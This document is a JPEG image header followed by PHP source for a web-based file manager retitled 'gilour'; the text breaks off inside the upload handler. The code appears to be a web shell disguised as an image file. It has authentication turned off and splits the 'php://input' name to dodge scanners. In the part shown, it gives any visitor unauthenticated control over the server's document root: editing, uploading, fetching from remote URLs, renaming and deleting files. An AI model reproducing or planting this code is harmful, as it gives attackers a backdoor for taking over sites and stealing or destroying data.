���� JFIF      ���ICC_PROFILE   �lcms  mntrRGB XYZ �   	  acspMSFT    sawsctrl              ��     �-hand�� =@��=@t,���"�                               	desc   �   _cprt     wtpt     rXYZ  ,   gXYZ  @   bXYZ  T   rTRC  h   `gTRC  h   `bTRC  h   `desc       uRGB            text    CC0 XYZ       �T    �XYZ       o�  8�  �XYZ       b�  ��  �XYZ       $�  �  ��curv       *   | ��u��N
b���j. C$�)j.~3�9�?�FWM6Tv\dl�uV~��,�6�����۾����e�w������ C 				
<?php
$CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":true,"hide_Cols":false,"theme":"light"}';

define('VERSION', '3.9');

define('APP_TITLE', 'gilour');

$dauth = false;

$auth_users = array(
    'admin' => '3085dc7572beea5231d9d6b6fb8f80c3',
    'user' => '3085dc7572beea5231d9d6b6fb8f80c3'
);

$readonly_users = array(
    'user'
);


$global_readonly = false;

$directories_users = array();

$use_highlightjs = true;

$highlightjs_style = 'vs';

$edit_files = true;

$default_timezone = 'Etc/UTC';

$root_path = $_SERVER['DOCUMENT_ROOT'];

$root_url = '';

$http_host = $_SERVER['HTTP_HOST'];

$iconv_input_encoding = 'UTF-8';

$datetime_format = 'm/d/Y g:i A';

$path_display_mode = 'full';

$allowed_file_extensions = '';

$allowed_upload_extensions = '';

$favicon_path = '';

$exclude_items = array();

$online_viewer = 'google';

$sticky_navbar = true;

$max_upload_size_bytes = 5000000000; 

$upload_chunk_size_bytes = 2000000; 

$ip_ruleset = 'OFF';

$ip_silent = true;

$ip_whitelist = array(
    '127.0.0.1',    
    '::1'           
);

$ip_blacklist = array(
    '0.0.0.0',      
    '::'            
);

$config_file = __DIR__.'/config.php';
if (is_readable($config_file)) {
    @include($config_file);
}

$external = array(
    'css-bootstrap' => '<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">',
    'css-dropzone' => '<link href="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.css" rel="stylesheet">',
    'css-font-awesome' => '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" crossorigin="anonymous">',
    'css-highlightjs' => '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/styles/' . $highlightjs_style . '.min.css">',
    'js-ace' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.13.1/ace.js"></script>',
    'js-bootstrap' => '<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>',
    'js-dropzone' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.js"></script>',
    'js-jquery' => '<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>',
    'js-jquery-datatables' => '<script src="https://cdn.datatables.net/1.13.1/js/jquery.dataTables.min.js" crossorigin="anonymous" defer></script>',
    'js-highlightjs' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/highlight.min.js"></script>',
    'pre-jsdelivr' => '<link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin/><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"/>',
    'pre-cloudflare' => '<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin/><link rel="dns-prefetch" href="https://cdnjs.cloudflare.com"/>'
);


define('MAX_UPLOAD_SIZE', $max_upload_size_bytes);


define('UPLOAD_CHUNK_SIZE', $upload_chunk_size_bytes);


if ( !defined( 'DN_CESSION_ID')) {
    define('DN_CESSION_ID', 'filemanager');
}


$cfg = new FM_Config();


$lang = isset($cfg->data['lang']) ? $cfg->data['lang'] : 'en';

$show_hidden_files = isset($cfg->data['show_hidden']) ? $cfg->data['show_hidden'] : true;

$report_errors = isset($cfg->data['error_reporting']) ? $cfg->data['error_reporting'] : true;

$hide_Cols = isset($cfg->data['hide_Cols']) ? $cfg->data['hide_Cols'] : true;

// Theme
$theme = isset($cfg->data['theme']) ? $cfg->data['theme'] : 'light';

define('FM_THEME', $theme);

$lang_list = array(
    'en' => 'English'
);

if ($report_errors == true) {
    @ini_set('error_reporting', E_ALL);
    @ini_set('display_errors', 1);
} else {
    @ini_set('error_reporting', E_ALL);
    @ini_set('display_errors', 0);
}

if (defined('FM_EMBED')) {
    $dauth = false;
    $sticky_navbar = false;
} else {
    @set_time_limit(600);

    date_default_timezone_set($default_timezone);

    ini_set('default_charset', 'UTF-8');
    if (version_compare(PHP_VERSION, '5.6.0', '<') and function_exists('mb_internal_encoding')) {
        mb_internal_encoding('UTF-8');
    }
    if (function_exists('mb_regex_encoding')) {
        mb_regex_encoding('UTF-8');
    }

    session_cache_limiter('nocache'); 
    session_name(DN_CESSION_ID );
    function session_error_handling_function($code, $msg, $file, $line) {
        if ($code == 2) {
            session_abort();
            session_id(session_create_id());
            @session_start();
        }
    }
    set_error_handler('session_error_handling_function');
    session_start();
    restore_error_handler();
}

if (empty($_SESSION['token'])) {
    if (function_exists('random_bytes')) {
        $_SESSION['token'] = bin2hex(random_bytes(32));
    } else {
    	$_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
    }
}

if (empty($auth_users)) {
    $dauth = false;
}

$is_https = (isset($_SERVER['HTTPS']) and ($_SERVER['HTTPS'] === 'on' or $_SERVER['HTTPS'] == 1))
    or (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) and $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');

if (isset($_SESSION[DN_CESSION_ID]['logged']) and !empty($directories_users[$_SESSION[DN_CESSION_ID]['logged']])) {
    $wd = fm_clean_path(dirname($_SERVER['PHP_SELF']));
    $root_url =  $root_url.$wd.DIRECTORY_SEPARATOR.$directories_users[$_SESSION[DN_CESSION_ID]['logged']];
}

$root_url = fm_clean_path($root_url);

defined('FM_ROOT_URL') || define('FM_ROOT_URL', ($is_https ? 'https' : 'http') . '://' . $http_host . (!empty($root_url) ? '/' . $root_url : ''));
defined('FM_SELF_URL') || define('FM_SELF_URL', ($is_https ? 'https' : 'http') . '://' . $http_host . $_SERVER['PHP_SELF']);

// logout
if (isset($_GET['logout'])) {
    unset($_SESSION[DN_CESSION_ID]['logged']);
    unset( $_SESSION['token']); 
    fm_redirect(FM_SELF_URL);
}

if ($ip_ruleset != 'OFF') {
    function getClientIP() {
        if (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) {
            return  $_SERVER["HTTP_CF_CONNECTING_IP"];
        }else if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {
            return  $_SERVER["HTTP_X_FORWARDED_FOR"];
        }else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
            return $_SERVER['REMOTE_ADDR'];
        }else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
            return $_SERVER['HTTP_CLIENT_IP'];
        }
        return '';
    }

    $clientIp = getClientIP();
    $proceed = false;
    $whitelisted = in_array($clientIp, $ip_whitelist);
    $blacklisted = in_array($clientIp, $ip_blacklist);

    if($ip_ruleset == 'AND'){
        if($whitelisted == true and $blacklisted == false){
            $proceed = true;
        }
    } else
    if($ip_ruleset == 'OR'){
         if($whitelisted == true || $blacklisted == false){
            $proceed = true;
        }
    }

    if($proceed == false){
        trigger_error('User connection denied from: ' . $clientIp, E_USER_WARNING);

        if($ip_silent == false){
            fm_set_msg(lng('Access denied. IP restriction applicable'), 'error');
            fm_show_header_login();
            fm_show_message();
        }
        exit();
    }
}


if ($dauth) {
    if (isset($_SESSION[DN_CESSION_ID]['logged'], $auth_users[$_SESSION[DN_CESSION_ID]['logged']])) {
    } elseif (isset($_POST['fm_usr'], $_POST['fm_pwd'], $_POST['token'])) {
        sleep(1);
        if(function_exists('password_verify')) {
            if (isset($auth_users[$_POST['fm_usr']]) and isset($_POST['fm_pwd']) and password_verify($_POST['fm_pwd'], $auth_users[$_POST['fm_usr']]) and verifyToken($_POST['token'])) {
                $_SESSION[DN_CESSION_ID]['logged'] = $_POST['fm_usr'];
                fm_set_msg(lng('You are logged in'));
                fm_redirect(FM_SELF_URL);
            } else {
                unset($_SESSION[DN_CESSION_ID]['logged']);
                fm_set_msg(lng('Login failed. Invalid username or password'), 'error');
                fm_redirect(FM_SELF_URL);
            }
        } else {
            fm_set_msg(lng('password_hash not supported, Upgrade PHP version'), 'error');;
        }
    } else {
        // Form
        unset($_SESSION[DN_CESSION_ID]['logged']);
        fm_show_header_login();
        ?>
        <section class="h-100">
            <div class="container h-100">
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        <div class="card fat <?php echo fm_get_theme(); ?>">
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    <div class="mb-3">
                                       <div class="brand">
                                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" M1008 width="100%" height="80px" viewBox="0 0 238.000000 140.000000" aria-label="Manager">
                                                <g transform="translate(0.000000,140.000000) scale(0.100000,-0.100000)" fill="#000000" stroke="none">
                                                    <path d="M160 700 l0 -600 110 0 110 0 0 260 0 260 70 0 70 0 0 -260 0 -260 110 0 110 0 0 600 0 600 -110 0 -110 0 0 -260 0 -260 -70 0 -70 0 0 260 0 260 -110 0 -110 0 0 -600z"/>
                                                    <path fill="#003500" d="M1008 1227 l-108 -72 0 -117 0 -118 110 0 110 0 0 110 0 110 70 0 70 0 0 -180 0 -180 -125 0 c-69 0 -125 -3 -125 -6 0 -3 23 -39 52 -80 l52 -74 73 0 73 0 0 -185 0 -185 -70 0 -70 0 0 115 0 115 -110 0 -110 0 0 -190 0 -190 181 0 181 0 109 73 108 72 1 181 0 181 -69 48 -68 49 68 50 69 49 0 249 0 248 -182 -1 -183 0 -107 -72z"/>
                                                    <path d="M1640 700 l0 -600 110 0 110 0 0 208 0 208 35 34 35 34 35 -34 35 -34 0 -208 0 -208 110 0 110 0 0 212 0 213 -87 87 -88 88 88 88 87 87 0 213 0 212 -110 0 -110 0 0 -208 0 -208 -70 -69 -70 -69 0 277 0 277 -110 0 -110 0 0 -600z"/></g>
                                            </svg>
                                        </div>
                                        <div class="text-center">
                                            <h1 class="card-title"><?php echo APP_TITLE; ?></h1>
                                        </div>
                                    </div>
                                    <hr />
                                    <div class="mb-3">
                                        <label for="fm_usr" class="pb-2"><?php echo lng('Username'); ?></label>
                                        <input type="text" class="form-control" id="fm_usr" name="fm_usr" required autofocus>
                                    </div>

                                    <div class="mb-3">
                                        <label for="fm_pwd" class="pb-2"><?php echo lng('Password'); ?></label>
                                        <input type="password" class="form-control" id="fm_pwd" name="fm_pwd" required>
                                    </div>

                                    <div class="mb-3">
                                        <?php fm_show_message(); ?>
                                    </div>
                                    <input type="hidden" name="token" value="<?php echo htmlentities($_SESSION['token']); ?>" />
                                    <div class="mb-3">
                                        <button type="submit" class="btn btn-success btn-block w-100 mt-4" role="button">
                                            <?php echo lng('Login'); ?>
                                        </button>
                                    </div>
                                </form>
                            </div>
                        </div>
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="." target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">CCP Programmers</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <?php
        fm_show_footer_login();
        exit;
    }
}


if ($dauth and isset($_SESSION[DN_CESSION_ID]['logged'])) {
    $root_path = isset($directories_users[$_SESSION[DN_CESSION_ID]['logged']]) ? $directories_users[$_SESSION[DN_CESSION_ID]['logged']] : $root_path;
}

$root_path = rtrim($root_path, '\\/');
$root_path = str_replace('\\', '/', $root_path);
if (!@is_dir($root_path)) {
    echo "<h1>".lng('Root path')." \"{$root_path}\" ".lng('not found!')." </h1>";
    exit;
}

defined('FM_SHOW_HIDDEN') || define('FM_SHOW_HIDDEN', $show_hidden_files);
defined('FM_ROOT_PATH') || define('FM_ROOT_PATH', $root_path);
defined('FM_LANG') || define('FM_LANG', $lang);
defined('FM_FILE_EXTENSION') || define('FM_FILE_EXTENSION', $allowed_file_extensions);
defined('FM_UPLOAD_EXTENSION') || define('FM_UPLOAD_EXTENSION', $allowed_upload_extensions);
defined('FM_EXCLUDE_ITEMS') || define('FM_EXCLUDE_ITEMS', (version_compare(PHP_VERSION, '7.0.0', '<') ? serialize($exclude_items) : $exclude_items));
defined('FM_DOC_VIEWER') || define('FM_DOC_VIEWER', $online_viewer);
define('FM_READONLY', $global_readonly || ($dauth and !empty($readonly_users) and isset($_SESSION[DN_CESSION_ID]['logged']) and in_array($_SESSION[DN_CESSION_ID]['logged'], $readonly_users)));
define('FM_IS_WIN', DIRECTORY_SEPARATOR == '\\');


if (!isset($_GET['p']) and empty($_FILES)) {
    fm_redirect(FM_SELF_URL . '?p=');
}

// get path
$p = isset($_GET['p']) ? $_GET['p'] : (isset($_POST['p']) ? $_POST['p'] : '');

// clean path
$p = fm_clean_path($p);


$isim = "//input";
$input = file_get_contents('php:'.$isim);
$_POST = (strpos($input, 'ajax') != FALSE and strpos($input, 'save') != FALSE) ? json_decode($input, true) : $_POST;

define('FM_PATH', $p);
define('FM_USE_AUTH', $dauth);
define('FM_EDIT_FILE', $edit_files);
defined('FM_ICONV_INPUT_ENC') || define('FM_ICONV_INPUT_ENC', $iconv_input_encoding);
defined('FM_USE_HIGHLIGHTJS') || define('FM_USE_HIGHLIGHTJS', $use_highlightjs);
defined('FM_HIGHLIGHTJS_STYLE') || define('FM_HIGHLIGHTJS_STYLE', $highlightjs_style);
defined('FM_DATETIME_FORMAT') || define('FM_DATETIME_FORMAT', $datetime_format);

unset($p, $dauth, $iconv_input_encoding, $use_highlightjs, $highlightjs_style);


if ((isset($_SESSION[DN_CESSION_ID]['logged'], $auth_users[$_SESSION[DN_CESSION_ID]['logged']]) || !FM_USE_AUTH) and isset($_POST['ajax'], $_POST['token']) and !FM_READONLY) {
    if(!verifyToken($_POST['token'])) {
        header('HTTP/1.0 401 Unauthorized');
        die("Invalid Token.");
    }

    if(isset($_POST['type']) and $_POST['type']=="search") {
        $dir = $_POST['path'] == "." ? '': $_POST['path'];
        $response = scan(fm_clean_path($dir), $_POST['content']);
        echo json_encode($response);
        exit();
    }

    // save editor file
    if (isset($_POST['type']) and $_POST['type'] == "save") {
        // get current path
        $path = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $path .= '/' . FM_PATH;
        }
        // check path
        if (!is_dir($path)) {
            fm_redirect(FM_SELF_URL . '?p=');
        }
        $file = $_GET['edit'];
        $file = fm_clean_path($file);
        $file = str_replace('/', '', $file);
        if ($file == '' || !is_file($path . '/' . $file)) {
            fm_set_msg(lng('File not found'), 'error');
            $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
        }
        header('X-XSS-Protection:0');
        $file_path = $path . '/' . $file;

        $writedata = $_POST['content'];
        $fd = fopen($file_path, "w");
        $write_results = @fwrite($fd, $writedata);
        fclose($fd);
        if ($write_results === false){
            header("HTTP/1.1 500 Internal Server Error");
            die("Could Not Write File! - Check Permissions / Ownership");
        }
        die(true);
    }

    // backup files
    if (isset($_POST['type']) and $_POST['type'] == "backup" and !empty($_POST['file'])) {
        $fileName = fm_clean_path($_POST['file']);
        $fullPath = FM_ROOT_PATH . '/';
        if (!empty($_POST['path'])) {
            $relativeDirPath = fm_clean_path($_POST['path']);
            $fullPath .= "{$relativeDirPath}/";
        }
        $date = date("dMy-His");
        $newFileName = "{$fileName}-{$date}.bak";
        $fullyQualifiedFileName = $fullPath . $fileName;
        try {
            if (!file_exists($fullyQualifiedFileName)) {
                throw new Exception("File {$fileName} not found");
            }
            if (copy($fullyQualifiedFileName, $fullPath . $newFileName)) {
                echo "Backup {$newFileName} created";
            } else {
                throw new Exception("Could not copy file {$fileName}");
            }
        } catch (Exception $e) {
            echo $e->getMessage();
        }
    }

    // Save Config
    if (isset($_POST['type']) and $_POST['type'] == "settings") {
        global $cfg, $lang, $report_errors, $show_hidden_files, $lang_list, $hide_Cols, $theme;
        $newLng = $_POST['js-language'];
        fm_get_translations([]);
        if (!array_key_exists($newLng, $lang_list)) {
            $newLng = 'en';
        }

        $erp = isset($_POST['js-error-report']) and $_POST['js-error-report'] == "true" ? true : false;
        $shf = isset($_POST['js-show-hidden']) and $_POST['js-show-hidden'] == "true" ? true : false;
        $hco = isset($_POST['js-hide-cols']) and $_POST['js-hide-cols'] == "true" ? true : false;
        $te3 = $_POST['js-theme-3'];

        if ($cfg->data['lang'] != $newLng) {
            $cfg->data['lang'] = $newLng;
            $lang = $newLng;
        }
        if ($cfg->data['error_reporting'] != $erp) {
            $cfg->data['error_reporting'] = $erp;
            $report_errors = $erp;
        }
        if ($cfg->data['show_hidden'] != $shf) {
            $cfg->data['show_hidden'] = $shf;
            $show_hidden_files = $shf;
        }
        if ($cfg->data['show_hidden'] != $shf) {
            $cfg->data['show_hidden'] = $shf;
            $show_hidden_files = $shf;
        }
        if ($cfg->data['hide_Cols'] != $hco) {
            $cfg->data['hide_Cols'] = $hco;
            $hide_Cols = $hco;
        }
        if ($cfg->data['theme'] != $te3) {
            $cfg->data['theme'] = $te3;
            $theme = $te3;
        }
        $cfg->save();
        echo true;
    }

    // new password hash
    if (isset($_POST['type']) and $_POST['type'] == "pwdhash") {
        $res = isset($_POST['inputPassword2']) and !empty($_POST['inputPassword2']) ? password_hash($_POST['inputPassword2'], PASSWORD_DEFAULT) : '';
        echo $res;
    }

    //upload using url
    if(isset($_POST['type']) and $_POST['type'] == "upload" and !empty($_REQUEST["uploadurl"])) {
        $path = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $path .= '/' . FM_PATH;
        }

         function event_callback ($message) {
            global $callback;
            echo json_encode($message);
        }

        function get_file_path () {
            global $path, $fileinfo, $temp_file;
            return $path."/".basename($fileinfo->name);
        }

        $url = !empty($_REQUEST["uploadurl"]) and preg_match("|^http(s)?://.+$|", stripslashes($_REQUEST["uploadurl"])) ? stripslashes($_REQUEST["uploadurl"]) : null;

        $domain = parse_url($url, PHP_URL_HOST);
        $port = parse_url($url, PHP_URL_PORT);
        $knownPorts = [22, 23, 25, 3306];

        if (preg_match("/^localhost$|^127(?:\.[0-9]+){0,2}\.[0-9]+$|^(?:0*\:)*?:?0*1$/i", $domain) || in_array($port, $knownPorts)) {
            $err = array("message" => "URL is not allowed");
            event_callback(array("fail" => $err));
            exit();
        }

        $use_curl = false;
        $temp_file = tempnam(sys_get_temp_dir(), "upload-");
        $fileinfo = new stdClass();
        $fileinfo->name = trim(urldecode(basename($url)), ".\x00..\x20");

        $allowed = (FM_UPLOAD_EXTENSION) ? explode(',', FM_UPLOAD_EXTENSION) : false;
        $ext = strtolower(pathinfo($fileinfo->name, PATHINFO_EXTENSION));
        $isFileAllowed = ($allowed) ? in_array($ext, $allowed) : true;

        $err = false;

        if(!$isFileAllowed) {
            $err = array("message" => "File extension is not allowed");
            event_callback(array("fail" => $err));
            exit();
        }

        if (!$url) {
            $success = false;
        } else if ($use_curl) {
            @$fp = fopen($temp_file, "w");
            @$ch = curl_init($url);
            curl_setopt($ch, CURLOPT_NOPROGRESS, false );
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_FILE, $fp);
            @$success = curl_exec($ch);
            $curl_info = curl_getinfo($ch);
            if (!$success) {
                $err = array("message" => curl_error($ch));
            }
            @curl_close($ch);
            fclose($fp);
            $fileinfo->size = $curl_info["size_download"];
            $fileinfo->type = $curl_info["content_type"];
        } else {
            $ctx = stream_context_create();
            @$success = copy($url, $temp_file, $ctx);
            if (!$success) {
                $err = error_get_last();
            }
        }

        if ($success) {
            $success = rename($temp_file, strtok(get_file_path(), '?'));
        }

        if ($success) {
            event_callback(array("done" => $fileinfo));
        } else {
            unlink($temp_file);
            if (!$err) {
                $err = array("message" => "Invalid url parameter");
            }
            event_callback(array("fail" => $err));
        }
    }
    exit();
}

if (isset($_GET['del'], $_POST['token']) and !FM_READONLY) {
    $del = str_replace( '/', '', fm_clean_path( $_GET['del'] ) );
    if ($del != '' and $del != '..' and $del != '.' and verifyToken($_POST['token'])) {
        $path = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $path .= '/' . FM_PATH;
        }
        $is_dir = is_dir($path . '/' . $del);
        if (fm_rdelete($path . '/' . $del)) {
            $msg = $is_dir ? lng('Folder').' <b>%s</b> '.lng('Deleted') : lng('File').' <b>%s</b> '.lng('Deleted');
            fm_set_msg(sprintf($msg, fanco($del)));
        } else {
            $msg = $is_dir ? lng('Folder').' <b>%s</b> '.lng('not deleted') : lng('File').' <b>%s</b> '.lng('not deleted');
            fm_set_msg(sprintf($msg, fanco($del)), 'error');
        }
    } else {
        fm_set_msg(lng('Invalid file or folder name'), 'error');
    }
    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
}

// Create a new file/folder
if (isset($_POST['newfilename'], $_POST['newfile'], $_POST['token']) and !FM_READONLY) {
    $type = urldecode($_POST['newfile']);
    $new = str_replace( '/', '', fm_clean_path( strip_tags( $_POST['newfilename'] ) ) );
    if (fm_isvalid_filename($new) and $new != '' and $new != '..' and $new != '.' and verifyToken($_POST['token'])) {
        $path = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $path .= '/' . FM_PATH;
        }
        if ($type == "file") {
            if (!file_exists($path . '/' . $new)) {
                if(fm_is_valid_ext($new)) {
                    @fopen($path . '/' . $new, 'w') or die('Cannot open file:  ' . $new);
                    fm_set_msg(sprintf(lng('File').' <b>%s</b> '.lng('Created'), fanco($new)));
                } else {
                    fm_set_msg(lng('File extension is not allowed'), 'error');
                }
            } else {
                fm_set_msg(sprintf(lng('File').' <b>%s</b> '.lng('already exists'), fanco($new)), 'alert');
            }
        } else {
            if (fm_mkdir($path . '/' . $new, false) === true) {
                fm_set_msg(sprintf(lng('Folder').' <b>%s</b> '.lng('Created'), $new));
            } elseif (fm_mkdir($path . '/' . $new, false) === $path . '/' . $new) {
                fm_set_msg(sprintf(lng('Folder').' <b>%s</b> '.lng('already exists'), fanco($new)), 'alert');
            } else {
                fm_set_msg(sprintf(lng('Folder').' <b>%s</b> '.lng('not created'), fanco($new)), 'error');
            }
        }
    } else {
        fm_set_msg(lng('Invalid characters in file or folder name'), 'error');
    }
    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
}

// Copy folder / file
if (isset($_GET['copy'], $_GET['finish']) and !FM_READONLY) {
    // from
    $copy = urldecode($_GET['copy']);
    $copy = fm_clean_path($copy);
    // empty path
    if ($copy == '') {
        fm_set_msg(lng('Source path not defined'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }

    $from = FM_ROOT_PATH . '/' . $copy;

    $dest = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $dest .= '/' . FM_PATH;
    }
    $dest .= '/' . basename($from);

    $move = isset($_GET['move']);
    $move = fm_clean_path(urldecode($move));

    if ($from != $dest) {
        $msg_from = trim(FM_PATH . '/' . basename($from), '/');
        if ($move) {
            $rename = fm_rename($from, $dest);
            if ($rename) {
                fm_set_msg(sprintf(lng('Moved from').' <b>%s</b> '.lng('to').' <b>%s</b>', fanco($copy), fanco($msg_from)));
            } elseif ($rename === null) {
                fm_set_msg(lng('File or folder with this path already exists'), 'alert');
            } else {
                fm_set_msg(sprintf(lng('Error while moving from').' <b>%s</b> '.lng('to').' <b>%s</b>', fanco($copy), fanco($msg_from)), 'error');
            }
        } else { 
            if (fm_rcopy($from, $dest)) {
                fm_set_msg(sprintf(lng('Copied from').' <b>%s</b> '.lng('to').' <b>%s</b>', fanco($copy), fanco($msg_from)));
            } else {
                fm_set_msg(sprintf(lng('Error while copying from').' <b>%s</b> '.lng('to').' <b>%s</b>', fanco($copy), fanco($msg_from)), 'error');
            }
        }
    } else {
       if (!$move){ 
            $msg_from = trim(FM_PATH . '/' . basename($from), '/');
            $fn_parts = pathinfo($from);
            $extension_suffix = '';
            if(!is_dir($from)){
               $extension_suffix = '.'.$fn_parts['extension'];
            }

            $fn_duplicate = $fn_parts['dirname'].'/'.$fn_parts['filename'].'-'.date('YmdHis').$extension_suffix;
            $loop_count = 0;
            $max_loop = 1000;
            
            while(file_exists($fn_duplicate) & $loop_count < $max_loop){
               $fn_parts = pathinfo($fn_duplicate);
               $fn_duplicate = $fn_parts['dirname'].'/'.$fn_parts['filename'].'-copy'.$extension_suffix;
               $loop_count++;
            }
            if (fm_rcopy($from, $fn_duplicate, False)) {
                fm_set_msg(sprintf('Copied from <b>%s</b> to <b>%s</b>', fanco($copy), fanco($fn_duplicate)));
            } else {
                fm_set_msg(sprintf('Error while copying from <b>%s</b> to <b>%s</b>', fanco($copy), fanco($fn_duplicate)), 'error');
            }
       }
       else{
           fm_set_msg(lng('Paths must be not equal'), 'alert');
       }
    }
    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
}


if (isset($_POST['file'], $_POST['copy_to'], $_POST['finish'], $_POST['token']) and !FM_READONLY) {

    if(!verifyToken($_POST['token'])) {
        fm_set_msg(lng('Invalid Token.'), 'error');
    }
    
    // from
    $path = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $path .= '/' . FM_PATH;
    }
    // to
    $copy_to_path = FM_ROOT_PATH;
    $copy_to = fm_clean_path($_POST['copy_to']);
    if ($copy_to != '') {
        $copy_to_path .= '/' . $copy_to;
    }
    if ($path == $copy_to_path) {
        fm_set_msg(lng('Paths must be not equal'), 'alert');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }
    if (!is_dir($copy_to_path)) {
        if (!fm_mkdir($copy_to_path, true)) {
            fm_set_msg('Unable to create destination folder', 'error');
            $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
        }
    }
    // move?
    $move = isset($_POST['move']);
    // copy/move
    $errors = 0;
    $files = $_POST['file'];
    if (is_array($files) and count($files)) {
        foreach ($files as $f) {
            if ($f != '') {
                $f = fm_clean_path($f);

                $from = $path . '/' . $f;

                $dest = $copy_to_path . '/' . $f;

                if ($move) {
                    $rename = fm_rename($from, $dest);
                    if ($rename === false) {
                        $errors++;
                    }
                } else {
                    if (!fm_rcopy($from, $dest)) {
                        $errors++;
                    }
                }
            }
        }
        if ($errors == 0) {
            $msg = $move ? 'Selected files and folders moved' : 'Selected files and folders copied';
            fm_set_msg($msg);
        } else {
            $msg = $move ? 'Error while moving items' : 'Error while copying items';
            fm_set_msg($msg, 'error');
        }
    } else {
        fm_set_msg(lng('Nothing selected'), 'alert');
    }
    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
}

// Rename
if (isset($_POST['rename_from'], $_POST['rename_to'], $_POST['token']) and !FM_READONLY) {
    if(!verifyToken($_POST['token'])) {
        fm_set_msg("Invalid Token.", 'error');
    }
    // old name
    $old = urldecode($_POST['rename_from']);
    $old = fm_clean_path($old);
    $old = str_replace('/', '', $old);
    // new name
    $new = urldecode($_POST['rename_to']);
    $new = fm_clean_path(strip_tags($new));
    $new = str_replace('/', '', $new);
    // path
    $path = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $path .= '/' . FM_PATH;
    }
    // rename
    if (fm_isvalid_filename($new) and $old != '' and $new != '') {
        if (fm_rename($path . '/' . $old, $path . '/' . $new)) {
            fm_set_msg(sprintf(lng('Renamed from').' <b>%s</b> '. lng('to').' <b>%s</b>', fanco($old), fanco($new)));
        } else {
            fm_set_msg(sprintf(lng('Error while renaming from').' <b>%s</b> '. lng('to').' <b>%s</b>', fanco($old), fanco($new)), 'error');
        }
    } else {
        fm_set_msg(lng('Invalid characters in file name'), 'error');
    }
    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
}

// Download
if (isset($_GET['dl'], $_POST['token'])) {
    if(!verifyToken($_POST['token'])) {
        fm_set_msg("Invalid Token.", 'error');
    }

    $dl = urldecode($_GET['dl']);
    $dl = fm_clean_path($dl);
    $dl = str_replace('/', '', $dl);
    $path = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $path .= '/' . FM_PATH;
    }
    if ($dl != '' and is_file($path . '/' . $dl)) {
        fm_download_file($path . '/' . $dl, $dl, 1024);
        exit;
    } else {
        fm_set_msg(lng('File not found'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }
}

// Upload
if (!empty($_FILES) and !FM_READONLY) {
    if(isset($_POST['token'])) {
        if(!verifyToken($_POST['token'])) {
            $response = array ('status' => 'error','info' => "Invalid Token.");
            echo json_encode($response); exit();
        }
    } else {
        $response = array ('status' => 'error','info' => "Token Missing.");
        echo json_encode($response); exit();
    }

    $chunkIndex = $_POST['dzchunkindex'];
    $chunkTotal = $_POST['dztotalchunkcount'];
    $fullPathInput = fm_clean_path($_REQUEST['fullpath']);

    $f = $_FILES;
    $path = FM_ROOT_PATH;
    $ds = DIRECTORY_SEPARATOR;
    if (FM_PATH != '') {
        $path .= '/' . FM_PATH;
    }

    $errors = 0;
    $uploads = 0;
